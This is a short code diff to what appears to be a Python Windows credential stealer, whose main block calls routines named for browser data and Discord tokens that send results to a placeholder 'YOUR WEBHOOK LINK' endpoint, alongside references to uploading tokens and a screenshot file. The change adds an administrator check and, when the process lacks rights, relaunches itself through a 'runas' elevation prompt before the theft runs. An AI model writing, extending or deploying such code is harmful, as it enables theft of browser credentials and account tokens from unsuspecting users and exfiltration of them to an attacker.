@@ -971,7 +971,16 @@ class upload_tokens:
                 pass
 
             if os.path.exists("ss.png"): os.remove("ss.png")
-            
+
+def cadm():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
 if "__main__" in __name__:
-    Browsers("YOUR WEBHOOK LINK")
-    DiscordToken("YOUR WEBHOOK LINK")
+    if cadm():
+        Browsers("YOUR WEBHOOK LINK")
+        DiscordToken("YOUR WEBHOOK LINK")
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
